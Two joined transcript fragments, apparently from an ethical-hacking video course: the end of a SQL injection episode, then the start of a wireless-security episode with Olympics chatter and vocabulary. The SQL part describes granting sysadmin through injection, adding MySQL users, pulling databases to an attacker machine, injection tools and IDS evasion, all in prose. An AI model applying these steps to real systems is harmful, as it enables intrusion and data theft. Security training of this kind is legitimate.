which would\nactually be the one we could use, so\n\n1102\n00:52:04.352 --> 00:52:05.550\nwe could do that.\n\n1103\n00:52:05.550 --> 00:52:09.530\nWe could also do sp_addserverrolemember,\nwhich would then allow us to specify\n\n1104\n00:52:09.530 --> 00:52:12.780\nsomething like sysadmin, so\nMicrosoft we can leverage that.\n\n1105\n00:52:12.780 --> 00:52:17.020\nIn My SQL, you do an insert into\nMy SQL user for the database.\n\n1106\n00:52:17.020 --> 00:52:20.510\nAnd then you would specify user, host,\npassword, and then specify the values.\n\n1107\n00:52:20.510 --> 00:52:23.860\nSo again, it's a little bit different\ndepending on the version of the database.\n\n1108\n00:52:23.860 --> 00:52:26.390\nBut it would not be very\ndifficult to understand.\n\n1109\n00:52:26.390 --> 00:52:29.510\nIt's really just a question of\nmaking sure we are educated,\n\n1110\n00:52:29.510 --> 00:52:33.170\nif you will,\non the different subtleties, right?\n\n1111\n00:52:33.170 --> 00:52:35.800\nHow do we transfer database\ndown to an attacker machine?\n\n1112\n00:52:35.800 --> 00:52:39.800\nWe will be able to go in,\ngrab that database and actually extract.\n\n1113\n00:52:39.800 --> 00:52:42.332\nYou saw me just essentially echo\nit back to the console here.\n\n1114\n00:52:42.332 --> 00:52:43.537\nIt would not be hard for\nme to issue a copy command.\n\n1115\n00:52:43.537 --> 00:52:44.685\n&gt;&gt; In here, pipe it up to a file.\n\n1116\n00:52:44.685 --> 00:52:45.241\n&gt;&gt; And just pipe it out.\n\n1117\n00:52:45.241 --> 00:52:45.972\n&gt;&gt; Absolutely.\nYeah yeah.\n\n1118\n00:52:45.972 --> 00:52:47.333\n&gt;&gt; Absolutely and just grab it so, I mean,\n\n1119\n00:52:47.333 --> 00:52:48.940\nI didn't bother to go to that trouble,\nright?\n\n1120\n00:52:48.940 --> 00:52:53.920\nBut, in the demo it would have been fairly\neasy for us to be able to do that as well.\n\n1121\n00:52:53.920 --> 00:52:56.290\nWe could load or\ninteract with the file system.\n\n1122\n00:52:56.290 --> 00:52:58.960\nYou'll load _file or into outfile and\n\n1123\n00:52:58.960 --> 00:53:02.500\ntake a look at what's going on in he\nfile system, interact with the OS.\n\n1124\n00:53:02.500 --> 00:53:04.500\nThere's so\nmany different things that we could do.\n\n1125\n00:53:04.500 --> 00:53:06.637\nWe could do network recon,\nwith SQL injection,\n\n1126\n00:53:06.637 --> 00:53:09.724\nwhere we gather IP information\nthrough reverse lookups against DNS.\n\n1127\n00:53:09.724 --> 00:53:13.210\nWe wouldn't have to do SQL injection, we\ncan do it other ways but we could do that.\n\n1128\n00:53:13.210 --> 00:53:15.970\nWe could use all sorts of tools.\n\n1129\n00:53:15.970 --> 00:53:18.840\nBecause remember, the DHCP database and\n\n1130\n00:53:18.840 --> 00:53:23.560\nDNS database as I said, databases, right,\nand we could attack those databases.\n\n1131\n00:53:23.560 --> 00:53:26.344\nHere, we often talk about it in\nthe network area, the recon area,\n\n1132\n00:53:26.344 --> 00:53:27.200\nthe sniffing area.\n\n1133\n00:53:27.200 --> 00:53:30.860\nIt's just getting the traffic on the wire\nand then trying to do a poisoning attack.\n\n1134\n00:53:30.860 --> 00:53:33.170\nWhy not go to the source and\njust do a SQL injection attack and\n\n1135\n00:53:33.170 --> 00:53:34.820\npull the data right out of the tables?\n\n1136\n00:53:34.820 --> 00:53:35.910\nI mean, we could do that as well.\n\n1137\n00:53:35.910 --> 00:53:37.410\nI'm not suggesting you have to do that.\n\n1138\n00:53:37.410 --> 00:53:40.310\nBut, I'm just pointing out there would\nbe another way to essentially get to\n\n1139\n00:53:40.310 --> 00:53:41.400\nthe same place.\n\n1140\n00:53:41.400 --> 00:53:43.960\nWhat are some tools that we\nmay use against this stuff?\n\n1141\n00:53:43.960 --> 00:53:45.660\nYou saw a SQL map obviously.\n\n1142\n00:53:45.660 --> 00:53:48.685\nA BS or BSQL hacker would be a good tool,\n\n1143\n00:53:48.685 --> 00:53:53.060\nSQL Injection tool that allows us to,\nit's called the Blind SQL hacker.\n\n1144\n00:53:53.060 --> 00:53:56.300\nIt's just abbreviated as BSQL but\nit's called a BSQL hacker.\n\n1145\n00:53:56.300 --> 00:53:59.440\nIt's a SQL Injection framework tool,\nthere's a marathon.\n\n1146\n00:53:59.440 --> 00:54:02.580\nThe marathon tool which should be another\none that would allow us to execute.\n\n1147\n00:54:02.580 --> 00:54:04.710\nI know we always like to listen tools.\n\n1148\n00:54:04.710 --> 00:54:07.640\nSQL Power Injector,\nright, that's a good one.\n\n1149\n00:54:07.640 --> 00:54:14.200\nHavij, H-A-V-I-J,\nHavij is one that is often used as well.\n\n1150\n00:54:14.200 --> 00:54:16.660\nSo just some odds and ends there.\n\n1151\n00:54:16.660 --> 00:54:18.940\nSQL Brute,\nthat's one that's often very popular.\n\n1152\n00:54:18.940 --> 00:54:20.210\nSQL Ninja.\n\n1153\n00:54:20.210 --> 00:54:22.445\nAnd Dart Jumper those are ones\nthat you often hear about,\n\n1154\n00:54:22.445 --> 00:54:23.980\nAbsinthe which is also a cool one.\n\n1155\n00:54:23.980 --> 00:54:26.190\nDid I ever tell you my Absinthe story?\n\n1156\n00:54:26.190 --> 00:54:28.606\n&gt;&gt; No, yes well tell us again.\n\n1157\n00:54:28.606 --> 00:54:30.026\n&gt;&gt; When I was in, did I tell you that one.\n\n1158\n00:54:30.026 --> 00:54:30.531\n&gt;&gt; I don't think so.\n\n1159\n00:54:30.531 --> 00:54:33.641\n&gt;&gt; No, so if you're familiar\nwith Absinthe obviously, for\n\n1160\n00:54:33.641 --> 00:54:35.680\nmany years outlawed as a drink.\n\n1161\n00:54:35.680 --> 00:54:41.000\nIt was not available to be sold and bought\nin the US until actually very recently.\n\n1162\n00:54:41.000 --> 00:54:43.690\nThey changed the laws and\nactually allow you to manufacture here.\n\n1163\n00:54:43.690 --> 00:54:46.570\nThere's a company making it in the US\nnow and you can buy it legally.\n\n1164\n00:54:46.570 --> 00:54:50.930\nBut, because it was made with\nhallucinogenic ingredients for\n\n1165\n00:54:50.930 --> 00:54:54.250\nmany years it was banned and\nit could kill you if you weren't careful,\n\n1166\n00:54:54.250 --> 00:54:55.860\nthat was not made the right way.\n\n1167\n00:54:55.860 --> 00:55:00.740\nBut, very popular drink overseas in\nEurope and France in particular, and\n\n1168\n00:55:00.740 --> 00:55:05.330\nso I'm over in we did it in London.\n\n1169\n00:55:05.330 --> 00:55:09.510\nSo I'm over in London, or\nno yeah no was it London or\n\n1170\n00:55:09.510 --> 00:55:10.880\nIreland I think it was in London.\n\n1171\n00:55:10.880 --> 00:55:13.930\nWe went to an Absinthe bar\nI'm with a bunch of people.\n\n1172\n00:55:13.930 --> 00:55:15.410\nWe go out and we're running around,\n\n1173\n00:55:15.410 --> 00:55:18.810\nwe're going out that night and\ngoing to a bunch of different bars.\n\n1174\n00:55:18.810 --> 00:55:22.130\nAnd one of the bars we were walking\nby was actually a full Absinthe bar,\n\n1175\n00:55:22.130 --> 00:55:23.730\na big sign out, Absinthe.\n\n1176\n00:55:23.730 --> 00:55:26.457\nOne of the girls we were with said\nwe have to go and try Absinthe,\n\n1177\n00:55:26.457 --> 00:55:28.418\nI've never tried Absinthe, I wanna try it.\n\n1178\n00:55:28.418 --> 00:55:31.857\nSo, all right, we all go in, and this is\na high, a really high and nice place,\n\n1179\n00:55:31.857 --> 00:55:34.850\nand they had a formal,\nit's almost like walking into a Starbucks.\n\n1180\n00:55:34.850 --> 00:55:38.840\nIt was like that, that whole section off\nto the side was just for the Absinthe bar.\n\n1181\n00:55:38.840 --> 00:55:42.876\nAnd so you walk in and\nthere's an Absinthe barista that's there.\n\n1182\n00:55:42.876 --> 00:55:44.120\n&gt;&gt; [LAUGH]\n&gt;&gt; Just like certified to do Absinthe.\n\n1183\n00:55:44.120 --> 00:55:47.769\nAnd so he gives us the whole history and\nthey got like five different types and\n\n1184\n00:55:47.769 --> 00:55:49.889\nthey make their own and\njust all this stuff.\n\n1185\n00:55:49.889 --> 00:55:52.339\nAnd so we figure it out and\nwe say what we're gonna do,\n\n1186\n00:55:52.339 --> 00:55:53.820\neverybody's gonna get a shot.\n\n1187\n00:55:53.820 --> 00:55:54.601\nWe're gonna drink it.\n\n1188\n00:55:54.601 --> 00:55:59.193\nSo he sets it all up for us and\nwe do the whole thing and It was so cool.\n\n1189\n00:55:59.193 --> 00:55:59.884\nIt was really cool.\n\n1190\n00:55:59.884 --> 00:56:00.491\nit was a neat experience.\n\n1191\n00:56:00.491 --> 00:56:01.533\n&gt;&gt; Have you tried it?\n\n1192\n00:56:01.533 --> 00:56:02.570\n&gt;&gt; Yeah, I've had it before.\n\n1193\n00:56:02.570 --> 00:56:07.210\nI've had, for me it wasn't a big deal,\nit was just one of those things, if you do\n\n1194\n00:56:07.210 --> 00:56:09.510\nit with friends it's kind of cool, if you\ndo it by yourself you have a problem.\n\n1195\n00:56:09.510 --> 00:56:10.799\n&gt;&gt; [LAUGH]\n&gt;&gt; Just be aware of that.\n\n1196\n00:56:10.799 --> 00:56:13.625\nBut if you do it with friends it's\nactually kind of a neat experience.\n\n1197\n00:56:13.625 --> 00:56:16.573\nBut if you're in the dark corner\nhiding and nobody knows you're there,\n\n1198\n00:56:16.573 --> 00:56:17.939\nyou may have to go seek some help.\n\n1199\n00:56:17.939 --> 00:56:20.470\nRemember the first step is\nadmitting you have a problem.\n\n1200\n00:56:20.470 --> 00:56:25.470\nAll right so SQL injection tools we talked\nabout a bunch of these SQL inject me.\n\n1201\n00:56:25.470 --> 00:56:29.080\nSQL SUS, the mole is another good one.\n\n1202\n00:56:29.080 --> 00:56:30.545\nThere's one called SQL Poizon.\n\n1203\n00:56:30.545 --> 00:56:32.495\nPoizon spelled with a Z instead of an S.\n\n1204\n00:56:32.495 --> 00:56:35.307\nYeah there's always different\nones that you can look at.\n\n1205\n00:56:35.307 --> 00:56:37.045\nSo obviously,\ngo out there and take a look.\n\n1206\n00:56:37.045 --> 00:56:41.915\nWould you have tools on the mobile\nplatform on DroidSQLi for, SQLi for\n\n1207\n00:56:41.915 --> 00:56:42.905\ninjection?\n\n1208\n00:56:42.905 --> 00:56:48.625\nThere's also sqlmapchik,\nS-Q-L-M-A-P-C-H-I-K which is\n\n1209\n00:56:48.625 --> 00:56:54.140\nan injection tool for mobile apps as well\nfound on the cross-platform SQLMap GUI.\n\n1210\n00:56:54.140 --> 00:56:58.720\nBut is run on the Android platform\nprimarily, so kinda cool.\n\n1211\n00:56:58.720 --> 00:56:59.740\n&gt;&gt; Absolutely.\n\n1212\n00:56:59.740 --> 00:57:01.570\n&gt;&gt; We could go in and we could do that.\n\n1213\n00:57:01.570 --> 00:57:05.280\nAnd we've talked about the different\nways in which we could evade IDSs and\n\n1214\n00:57:05.280 --> 00:57:07.010\ndetection in other episodes.\n\n1215\n00:57:07.010 --> 00:57:10.220\nAnd we would obviously bring that\nknowledge to bear here by obscuring input\n\n1216\n00:57:10.220 --> 00:57:14.860\nstrings and hiding our activity trying to\nfigure out or hide what we're doing so\n\n1217\n00:57:14.860 --> 00:57:17.010\nthat people don't know\nwhat it is we're up to and\n\n1218\n00:57:17.010 --> 00:57:18.910\nthat would be part of what we're\nthinking about here as well.\n\n1219\n00:57:18.910 --> 00:57:21.740\nYou know just as we end up the\nconversation thinking about now that we've\n\n1220\n00:57:21.740 --> 00:57:25.110\ndone all this, how do we actually\nhide it so we know what to look for.\n\n1221\n00:57:25.110 --> 00:57:27.010\nThe common classic\nthings that we would do,\n\n1222\n00:57:27.010 --> 00:57:31.190\nencrypt the traffic, obfuscate it,\nput it inside other stuff.\n\n1223\n00:57:31.190 --> 00:57:32.630\nWe talked about fragmenting,\n\n1224\n00:57:32.630 --> 00:57:38.290\nwe talked about using the common command\nto make the query code look innocuous and\n\n1225\n00:57:38.290 --> 00:57:40.700\nthen actually, it's gonna executed,\nstuff like that.\n\n1226\n00:57:40.700 --> 00:57:42.580\nSo, just think about those kind of things.\n\n1227\n00:57:42.580 --> 00:57:45.630\nCuz those are the classic countermeasures.\n\n1228\n00:57:45.630 --> 00:57:48.150\nThe hacker would engage and\nhide what they were doing.\n\n1229\n00:57:48.150 --> 00:57:51.940\nYou obviously have to be educated to\nknow that that stuff's going on as well.\n\n1230\n00:57:51.940 --> 00:57:54.650\n&gt;&gt; All right, Adam,\ngreat look there at SQL injection.\n\n1231\n00:57:54.650 --> 00:57:57.520\n&gt;&gt; Talked about what it is,\nhow is it accomplished.\n\n1232\n00:57:57.520 --> 00:58:00.230\nWe looked at about a bunch of\nthe different commands we might use to\n\n1233\n00:58:00.230 --> 00:58:02.080\ndetermine whether a website or\n\n1234\n00:58:02.080 --> 00:58:07.230\nweb application is vulnerable\nto a SQL injection type attack.\n\n1235\n00:58:07.230 --> 00:58:11.020\nDid a great hands-on a fantastic\ndemonstration in there.\n\n1236\n00:58:11.020 --> 00:58:12.890\n&gt;&gt; I think brilliant is the word\nyou were looking for there.\n\n1237\n00:58:12.890 --> 00:58:14.090\n&gt;&gt; Brilliant was the word\nI was looking for.\n\n1238\n00:58:14.090 --> 00:58:16.560\n&gt;&gt; It think you were struggling wanted\nto help you with that it was brilliant.\n\n1239\n00:58:16.560 --> 00:58:17.910\n&gt;&gt; Thank you for helping me there.\n\n1240\n00:58:17.910 --> 00:58:20.720\n&gt;&gt; A brilliant demonstration\non SQL injection.\n\n1241\n00:58:20.720 --> 00:58:23.620\nI mean we were able to go in there,\npull out the names of the databases,\n\n1242\n00:58:23.620 --> 00:58:24.390\nonce we have that,\n\n1243\n00:58:24.390 --> 00:58:28.100\nwe've pulled out the names of the tables,\nthen pulled out the columns of the tables,\n\n1244\n00:58:28.100 --> 00:58:30.950\nand then actually started pulling\nback the data out of those columns.\n\n1245\n00:58:30.950 --> 00:58:33.330\nSo brilliant is a great word for that.\n\n1246\n00:58:33.330 --> 00:58:36.020\nI hope everybody out\nthere enjoyed watching.\n\n1247\n00:58:36.020 --> 00:58:38.820\nSigning off for\nIT Pro TV I'm Mike Rodrick.\n\n1248\n00:58:38.820 --> 00:58:43.710\n&gt;&gt; I am the brilliant hacker slash\ninjector of SQL services and databases.\n\n1249\n00:58:43.710 --> 00:58:45.196\nOtherwise known as Adam,\nthank you very much.\n\n1250\n00:58:45.196 --> 00:58:46.250\n&gt;&gt; And we'll see you next time.\n\n1251\n00:58:46.250 --> 00:58:47.870\n&gt;&gt; Take care everybody.\n\n1252\n00:58:47.870 --> 00:58:56.380\n[MUSIC]\n\n",

Very good, very good.\n\n15\n00:00:41.250 --> 00:00:43.570\nAnd actually it's not just gonna be me,\nI'm gonna move over this way.\n\n16\n00:00:43.570 --> 00:00:46.430\nIt's gonna be me and Pink Pony.\n\n17\n00:00:46.430 --> 00:00:47.448\n&gt;&gt; Pink Pony is in the house.\n\n18\n00:00:47.448 --> 00:00:49.820\nI like it.\n&gt;&gt; If you're gonna go neon,\n\n19\n00:00:49.820 --> 00:00:52.217\ngo fully neon is what I would say.\n\n20\n00:00:52.217 --> 00:00:55.340\n[LAUGH] So we're gonna talk a little\nbit of wireless, as Mike was saying.\n\n21\n00:00:55.340 --> 00:00:58.240\nWe're gonna start out, as we often\ndo in some of these conversation,\n\n22\n00:00:58.240 --> 00:01:00.880\nespecially with something as diverse and\n\n23\n00:01:00.880 --> 00:01:03.740\nas detailed as you were suggesting\nin your opening remarks.\n\n24\n00:01:03.740 --> 00:01:04.660\nVery good, by the way, sir.\n\n25\n00:01:04.660 --> 00:01:06.690\nThank you for setting that up for us.\n\n26\n00:01:06.690 --> 00:01:09.860\nIn the theme of the Olympics was\nperfect set from Olympic volleyball.\n\n27\n00:01:09.860 --> 00:01:12.190\nYou know how much Olympic\nvolleyball I had to watch?\n\n28\n00:01:12.190 --> 00:01:16.004\nCuz my wife is nuts for\nsoccer and volleyball.\n\n29\n00:01:16.004 --> 00:01:18.581\nMy niece plays volleyball in college,\nso she's obviously,\n\n30\n00:01:18.581 --> 00:01:21.017\nthe family watches volleyball\nbecause it's a big thing.\n\n31\n00:01:21.017 --> 00:01:25.605\nBut I must have watched, I can't even\nimagine, that's how much volleyball.\n\n32\n00:01:25.605 --> 00:01:26.895\n&gt;&gt; Because you've got women's and men's.\n\n33\n00:01:26.895 --> 00:01:27.635\n&gt;&gt; Women's and men.\n\n34\n00:01:27.635 --> 00:01:28.405\n&gt;&gt; Beach volleyball.\n\n35\n00:01:28.405 --> 00:01:29.005\n&gt;&gt; Beach, right.\n\n36\n00:01:29.005 --> 00:01:29.545\nBeach volleyball.\n\n37\n00:01:29.545 --> 00:01:30.613\n&gt;&gt; Then you've got the indoor volleyball.\n\n38\n00:01:30.613 --> 00:01:33.202\n&gt;&gt; Then you've got the men's stuff and\nwomen's stuff, right.\n\n39\n00:01:33.202 --> 00:01:36.329\nThe full court stuff,\nwhich is also kind of cool and\n\n40\n00:01:36.329 --> 00:01:40.060\nyou see ten foot five giants\nserving at 140 miles an hour.\n\n41\n00:01:40.060 --> 00:01:41.230\n&gt;&gt; And they're 19.\n\n42\n00:01:41.230 --> 00:01:43.750\n&gt;&gt; Which is even crazier but\nthere was apparently, and\n\n43\n00:01:43.750 --> 00:01:47.040\nthis is just a random factoid, not that\nwe ever do this on any of our shows,\n\n44\n00:01:47.040 --> 00:01:49.110\nwhy would you think\nthis would be the case?\n\n45\n00:01:49.110 --> 00:01:51.420\nBut so one thing and then we will\nactually get to why we are here.\n\n46\n00:01:51.420 --> 00:01:52.507\nTo talk about wireless.\n\n47\n00:01:52.507 --> 00:01:55.700\n[LAUGH] I was listening in particular,\nI think it was the Russian match,\n\n48\n00:01:55.700 --> 00:01:58.550\none of the Russian matches,\nthe full indoor men's team.\n\n49\n00:01:58.550 --> 00:02:01.950\nThey said the main guy who had\nhelped them in the last Olympics,\n\n50\n00:02:01.950 --> 00:02:04.390\nthat was integral to their success,\ndidn't make it.\n\n51\n00:02:04.390 --> 00:02:06.160\n&gt;&gt; He was like seven two.\n\n52\n00:02:06.160 --> 00:02:08.640\nApparently, for whatever reason he\nwasn't able to compete this time, so\n\n53\n00:02:08.640 --> 00:02:09.600\nhe wasn't on the team.\n\n54\n00:02:09.600 --> 00:02:10.766\nHe's over seven feet.\n\n55\n00:02:10.766 --> 00:02:14.032\n[LAUGH] That's like a whole\ndifferent kind of tall, right?\n\n56\n00:02:14.032 --> 00:02:17.052\nSo you look at the swimmers,\ntoo, like Lochte and Phelps.\n\n57\n00:02:17.052 --> 00:02:19.377\nThey're all like six six,\nsix eight; six nine.\n\n58\n00:02:19.377 --> 00:02:20.303\n&gt;&gt; Which is a tall person.\n\n59\n00:02:20.303 --> 00:02:21.357\n&gt;&gt; Tall, right?\n\n60\n00:02:21.357 --> 00:02:25.680\nAnd but then you've got like over seven,\nwhich is a whole different kind of tall.\n\n61\n00:02:25.680 --> 00:02:28.310\n&gt;&gt; Is he pretty much just reaching up and\ntouching the rim or\n\n62\n00:02:28.310 --> 00:02:30.210\nhe's looking over the net at this point?\n\n63\n00:02:30.210 --> 00:02:32.550\n&gt;&gt; I would imagine at seven feet,\na little bit over seven,\n\n64\n00:02:32.550 --> 00:02:36.300\nyou actually have to be able to be\nessentially probably almost at net level.\n\n65\n00:02:36.300 --> 00:02:37.900\n&gt;&gt; Yeah.\n&gt;&gt; And I'm sure you don't have to go very\n\n66\n00:02:37.900 --> 00:02:40.150\nhigh to be able to reach over the net.\n\n67\n00:02:40.150 --> 00:02:43.670\nYou may even be able to spike with your\nhead just by doing one of these and\n\n68\n00:02:43.670 --> 00:02:45.210\nI don't even know if that's allowed or\nnot.\n\n69\n00:02:45.210 --> 00:02:45.790\nI'm not sure.\n\n70\n00:02:45.790 --> 00:02:48.730\n&gt;&gt; Wow.\n&gt;&gt; But it just is kind of crazy.\n\n71\n00:02:48.730 --> 00:02:49.760\n&gt;&gt; It is.\n\n72\n00:02:49.760 --> 00:02:51.530\nIt is.\n&gt;&gt; And they serve at like 130.\n\n73\n00:02:51.530 --> 00:02:54.170\nSomething, like a ridiculous,\nrdiculously fast.\n\n74\n00:02:54.170 --> 00:02:55.740\n&gt;&gt; Diving and\nthrowing their bodies in front of-\n\n75\n00:02:55.740 --> 00:02:58.330\n&gt;&gt; Yeah, yeah, which is kind of crazy.\n\n76\n00:02:58.330 --> 00:03:02.010\nThat's why if I was gonna be an Olympic\nathlete, I would take up golf or archery.\n\n77\n00:03:02.010 --> 00:03:04.670\nAnd I'm not in any way indicating\nthat those are not valid sports,\n\n78\n00:03:04.670 --> 00:03:05.770\nquite the opposite.\n\n79\n00:03:05.770 --> 00:03:09.170\n&gt;&gt; I can't do either one well, so\nI'm amazed by the fact people can do them.\n\n80\n00:03:09.170 --> 00:03:13.240\nBut you just, if you think about it,\nyou can compete in those sports,\n\n81\n00:03:13.240 --> 00:03:18.140\ntraditionally, as being older because it's\nnot the same kind of physical stamina,\n\n82\n00:03:18.140 --> 00:03:19.220\nthe same kind of conditioning,\n\n83\n00:03:19.220 --> 00:03:22.780\nwhere you've got to be running up and\ndown a court for an hour, right?\n\n84\n00:03:22.780 --> 00:03:24.530\n&gt;&gt; Yeah.\n&gt;&gt; Or doing, sorta swimming or whatever.\n\n85\n00:03:24.530 --> 00:03:27.130\nI mean it's really a young\nperson's activity, for most part.\n\n86\n00:03:27.130 --> 00:03:29.553\n&gt;&gt; I wanna say Phelps is\napproaching 30 maybe-\n\n87\n00:03:29.553 --> 00:03:30.675\n&gt;&gt; He is I think 30 or 31,\n\n88\n00:03:30.675 --> 00:03:32.519\nthis is theoretically his last Olympics.\n\n89\n00:03:32.519 --> 00:03:34.259\n&gt;&gt; He's ancient.\n\n90\n00:03:34.259 --> 00:03:36.600\n&gt;&gt; Yeah, I mean, he's done.\n\n91\n00:03:36.600 --> 00:03:42.080\nBut you look at the girl who won\nall the golds for the Americans.\n\n92\n00:03:42.080 --> 00:03:44.940\nCathy whatever her name was right.\n\n93\n00:03:44.940 --> 00:03:46.090\nShe's, I think 19.\n\n94\n00:03:46.090 --> 00:03:49.590\nI mean you've gotta be really young to\ndo some of these sports and do it well.\n\n95\n00:03:49.590 --> 00:03:53.200\n&gt;&gt; The gymnastics are all,\nmost of the gymnasts are like 15, 16, 17.\n\n96\n00:03:53.200 --> 00:03:54.390\n&gt;&gt; Yes.\n&gt;&gt; 18 years old, right?\n\n97\n00:03:54.390 --> 00:03:55.470\nAnd so it's just interesting.\n\n98\n00:03:55.470 --> 00:03:57.440\nCuz if you look at some of the golfers,\nfor instance,\n\n99\n00:03:57.440 --> 00:04:00.280\nthe archers, they tend to be,\nyou can see they're a little bit older.\n\n100\n00:04:00.280 --> 00:04:01.750\n&gt;&gt; Right.\n&gt;&gt; And they're not you know\n\n101\n00:04:01.750 --> 00:04:02.400\nretiring at 20.\n\n102\n00:04:02.400 --> 00:04:04.398\n&gt;&gt; Yeah. [LAUGH] &gt;&gt; They're actually\nplaying, they may have two or\n\n103\n00:04:04.398 --> 00:04:06.062\nthree Olympics in them\nbefore they have to get out.\n\n104\n00:04:06.062 --> 00:04:08.385\nSo anyway,\nwe're not here to talk about the Olympics.\n\n105\n00:04:08.385 --> 00:04:11.850\nPost Olympics chats that we\ncan name in a new podcast.\n\n106\n00:04:11.850 --> 00:04:13.850\nSo we're gonna actually\ntalk about wireless.\n\n107\n00:04:13.850 --> 00:04:15.970\nSo as I was saying perfect setup for\n\n108\n00:04:15.970 --> 00:04:19.635\nwireless but\nas we do with these particular shows,\n\n109\n00:04:19.635 --> 00:04:23.290\nwe're gonna start with a little of\nvocabulary cuz it is very important for\n\n110\n00:04:23.290 --> 00:04:27.290\nus to able, for you certainly and for us\n&gt;&gt; To be able to talk about these terms,\n\n111\n00:04:27.290 --> 00:04:30.570\nmake sure we understand them, essentially\nbaseline the definitions for you,\n\n112\n00:04:30.570 --> 00:04:31.740\nright, and\nmake sure you're comfortable with them.\n\n113\n00:04:31.740 --> 00:04:35.840\nSo I know, sir,\nyou have put together a vocabulary list.\n\n114\n00:04:35.840 --> 00:04:40.760\nWe're gonna go to that list and\nafter the magic of switching technology.\n\n115\n00:04:40.760 --> 00:04:41.870\n&gt;&gt; Here we are, look at that.\n\n116\n00:04:41.870 --> 00:04:43.320\nAll right, so wireless vocabulary.\n\n117\n00:04:43.320 --> 00:04:46.560\nSo let's go through this\nin no particular order but\n\n118\n00:04:46.560 --> 00:04:48.250\njust wanna be able to talk about them.\n\n119\n00:04:48.250 --> 00:04:51.110\nAs with any of the vocabulary\nlists that we put together,\n\n120\n00:04:51.110 --> 00:04:52.580\nI know we will make them available.\n\n121\n00:04:52.580 --> 00:04:54.830\nCertainly Mike will make sure\nthey get posted for you.\n\n122\n00:04:54.830 --> 00:04:57.550\n&gt;&gt; Definitely wanna recommend,\nremind and encourage,\n\n123\n00:04:57.550 --> 00:05:01.440\nhowever you wanna take that, that you\nshould study the vocabulary terms,\n\n124\n00:05:01.440 --> 00:05:03.980\nperhaps flash cards,\nright, may be a good idea.\n\n125\n00:05:03.980 --> 00:05:04.890\nSomething like that.\n\n126\n00:05:04.890 --> 00:05:06.990\nBut definitely go through the vocabulary,\n\n127\n00:05:06.990 --> 00:05:10.120\nunderstand the definitions\nbefore you take the exam.\n\n128\n00:05:10.120 --> 00:05:13.330\nAny of the points where we go through and\ntalk about, for instance,\n\n129\n00:05:13.330 --> 00:05:17.780\nhow WEP may work or\nhow TKIP works or things like that.\n\n130\n00:05:17.780 --> 00:05:20.340\nThere's some pretty detailed\nconversations in this section.\n\n131\n00:05:20.340 --> 00:05:22.400\nDefinitely wanna understand those steps,\n\n132\n00:05:22.400 --> 00:05:25.745\nunderstand the prioritized order of\nhow things worked, the vocabulary,\n\n133\n00:05:25.745 --> 00:05:29.325\nterminology, very important for\nus to take note of here.\n\n134\n00:05:29.325 --> 00:05:32.865\nAll right, so GSM, right,\nuniversal system used for\n\n135\n00:05:32.865 --> 00:05:36.585\nessentially mobile transportation for\nwireless networks worldwide.\n\n136\n00:05:36.585 --> 00:05:40.295\nIn other words, this is the common\nunderlying system that we use for\n\n137\n00:05:40.295 --> 00:05:41.790\nwireless networks, right?\n\n138\n00:05:41.790 --> 00:05:42.300\nBandwidth.\n\n139\n00:05:43.300 --> 00:05:46.060\nGenerically this is the idea\nof the amount of information\n\n140\n00:05:46.060 --> 00:05:47.850\nwe can broadcast over a connection.\n\n141\n00:05:47.850 --> 00:05:52.200\nWe often measure this in either kilobits\nper second or kilobytes per second.\n\n142\n00:05:52.200 --> 00:05:55.750\nMegabytes, gigabytes,\nwhatever it is per second.\n\n143\n00:05:55.750 --> 00:05:59.610\nDo we have the whole gigabytes,\ngigabits bandwidth debate?\n\n144\n00:05:59.610 --> 00:06:01.430\nI get that all the time.\n\n145\n00:06:01.430 --> 00:06:02.150\nIs it one, or\n\n146\n00:06:02.150 --> 00:06:06.090\ndid you say the right one, I don't know\nwhich one I said and which one was right.\n\n147\n00:06:06.090 --> 00:06:07.120\nSo either bytes or bits.\n\n148\n00:06:07.120 --> 00:06:08.480\nWhatever you prefer!\n\n149\n00:06:08.480 --> 00:06:09.616\nBut it's how we measure bandwidth.\n\n150\n00:06:09.616 --> 00:06:10.600\n&gt;&gt; [LAUGH]\n&gt;&gt; So we don't get nailed on\n\n151\n00:06:10.600 --> 00:06:11.170\nthat one later.\n\n152\n00:06:11.170 --> 00:06:13.790\nSo you'll say, you said that,\nit should have been the other way.\n\n153\n00:06:13.790 --> 00:06:15.629\nYou understand what I am talking about,\nright?\n\n154\n00:06:15.629 --> 00:06:17.900\nWe just wanna make sure we understand\nthe throughput essentially.\n\n155\n00:06:17.900 --> 00:06:21.200\nRight, of the amount of information\nmoving through the system\n\n156\n00:06:21.200 --> 00:06:23.550\nthrough a fixed point over\na fixed amount of time.\n\n157\n00:06:23.550 --> 00:06:26.850\nThat's how we measure it and\nwe always want to think about that.\n\n158\n00:06:26.850 --> 00:06:32.140\nWhen we think about the BSSID,\nthis is the Basic Service Set ID.\n\n159\n00:06:32.140 --> 00:06:34.200\nPeople often just refer to it as the SSID,\n\n160\n00:06:34.200 --> 00:06:38.545\nwe don’t often call it formally by\nits real name, which is the BSSID.\n\n161\n00:06:38.545 --> 00:06:40.040\nB-S-S-I-D, you can't see me.\n\n162\n00:06:40.040 --> 00:06:42.904\nI'm holding up my fingers as I\ndo that to get that correct.\n\n163\n00:06:42.904 --> 00:06:45.870\n&gt;&gt; [LAUGH]\n&gt;&gt; But it is the MAC address of an access\n\n164\n00:06:45.870 --> 00:06:49.160\npoint that has set up\nthe Basic Service Set solutions.\n\n165\n00:06:49.160 --> 00:06:51.750\nSo the SSID is what we often refer to\n\n166\n00:06:51.750 --> 00:06:54.560\nwhen we think of going to\na wireless access point.\n\n167\n00:06:54.560 --> 00:06:58.460\nYeah, we talk about here ITProTV, right.\n\n168\n00:06:58.460 --> 00:06:59.920\nOr whatever it may be.\n\n169\n00:06:59.920 --> 00:07:00.870\nAnd we connect to that.\n\n170\n00:07:00.870 --> 00:07:02.290\nThat's the SSID.\n\n171\n00:07:02.290 --> 00:07:05.830\nThe BSSID is the MAC address of\nthat access point that we actually\n\n172\n00:07:05.830 --> 00:07:06.410\nare connecting,\n\n173\n00:07:06.410 --> 00:07:09.700\nwhich you just don't hear people talk\nabout that or think about that one.\n\n174\n00:07:09.700 --> 00:07:12.060\nBut it's one that we should be aware of.\n\n175\n00:07:12.060 --> 00:07:16.320\nWe have ISM band, just kind of scooting\ndown there towards the bottom.\n\n176\n00:07:16.320 --> 00:07:17.300\nThis is kind of interesting.\n\n177\n00:07:17.300 --> 00:07:19.400\nAgain, I don't hear a lot\nof people talk about this.\n\n178\n00:07:19.400 --> 00:07:23.060\nIf you're not in the industry, you don't\ntend to be aware of these kind of things.\n\n179\n00:07:23.060 --> 00:07:28.139\nIt's a very siloed but the 